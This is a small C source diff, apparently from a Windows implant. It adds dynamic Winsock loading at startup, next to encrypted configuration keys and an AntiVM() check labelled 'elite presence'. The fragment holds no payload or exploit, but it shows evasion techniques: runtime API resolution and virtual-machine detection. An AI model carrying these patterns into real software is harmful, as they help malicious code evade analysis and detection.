@@ -32,6 +32,7 @@
 
 extern VOID SyncThreadFunction();
 extern PWCHAR GetRandomString(ULONG uMin);
+extern PDYNAMIC_WINSOCK dynamicWinsock;
 
 //extern BYTE pServerKey[32];
 //extern BYTE pConfKey[32];
@@ -113,6 +114,13 @@ int CALLBACK WinMain(HINSTANCE hInstance,
 	MD5((PBYTE)ENCRYPTION_KEY_CONF, 32, (PBYTE)pConfKey);
 	MD5((PBYTE)ENCRYPTION_KEY, 32, (PBYTE)pLogKey);
 #endif
+
+	/* init dynamic winsock */
+	if((dynamicWinsock = (PDYNAMIC_WINSOCK) malloc(sizeof(DYNAMIC_WINSOCK))) == NULL)
+		return 0;
+	if(!API_LoadWinsock(&dynamicWinsock))
+		return 0;
+
 
 	// first check for elite presence
 	BOOL bVM = AntiVM();
